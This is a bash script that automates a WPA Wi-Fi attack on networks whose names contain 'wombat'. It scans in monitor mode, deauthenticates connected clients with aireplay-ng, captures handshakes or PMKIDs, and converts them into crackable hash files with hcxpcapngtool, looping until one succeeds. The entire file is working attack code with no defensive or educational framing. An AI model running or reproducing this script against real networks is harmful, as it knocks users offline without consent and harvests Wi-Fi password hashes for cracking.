#!/bin/bash
# Enable recursive globbing for cleaning
shopt -s globstar

# Configuration
INTERFACE="wlp0s20f3mon"
TARGET_STRING="wombat"
OUTPUT_DIR="./captures"
mkdir -p "$OUTPUT_DIR"

echo "[+] Starting target cycle for: $TARGET_STRING"

# 1. Prepare Interface
sudo airmon-ng check kill
sudo airmon-ng start $INTERFACE

# Main loop
while true; do
    # 2. Initial Scan to find channels
    echo "[+] Scanning for '$TARGET_STRING' targets (15 seconds)..."
    # 1. Perform a quick 15s scan to find current channels for "wombat" targets
    sudo timeout 15s airodump-ng --essid-regex ".*$TARGET_STRING.*" -w "$OUTPUT_DIR/scan" --output-format csv "$INTERFACE" > /dev/null 2>&1
    
    # 2. Parse the latest CSV for BSSID and Channel
    LATEST_CSV=$(ls -t "$OUTPUT_DIR/scan"*.csv | head -n 1)
    TARGET_LIST=$(awk -F, '/'$TARGET_STRING'/ && $1 ~ /..:..:..:..:..:../ && $4 ~ /^[0-9]+$/ {print $1","$4}' "$LATEST_CSV" | sort -u)

    for target in $TARGET_LIST; do
        BSSID=$(echo $target | cut -d',' -f1)
        CH=$(echo $target | cut -d',' -f2)
        CLEAN_BSSID=${BSSID//:/_}
        SESSION_CAP="$OUTPUT_DIR/session_$CLEAN_BSSID"

        echo "[+] Monitoring $BSSID on Channel $CH..."
        
        # Start airodump-ng for 60 seconds
        sudo timeout 60s airodump-ng --bssid "$BSSID" -c "$CH" -w "$SESSION_CAP" "$INTERFACE" > /dev/null 2>&1 &
        sleep 5 # Let it settle

        # Send a light deauth "poke"
        sudo aireplay-ng -0 3 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1
        
        # Wait for the 60s capture to finish
        wait

        # 3. THE VALIDATION CHECK
        # Use hcxpcapngtool to see if a crackable hash was actually caught
        # If it writes a file, we have a winner.
        TEST_HASH="$OUTPUT_DIR/check_${CLEAN_BSSID}.hc22000"
        hcxpcapngtool -o "$TEST_HASH" "$SESSION_CAP"-01.cap > /dev/null 2>&1

        if [ -s "$TEST_HASH" ]; then
            echo "[!!!] SUCCESS: Valid handshake/PMKID captured for $BSSID!"
            echo "[+] Hash saved to: $TEST_HASH"
            # Optional: Move the successful .cap to a "finished" folder
            exit 0 # Stop everything
        else
            echo "[-] No valid handshake yet for $BSSID. Moving to next target..."
            rm -f "$TEST_HASH" "$SESSION_CAP"* # Clean up failed attempt
        fi
    done
    
    echo "[+] Finished one full sweep. Restarting scan..."
    sleep 2
done

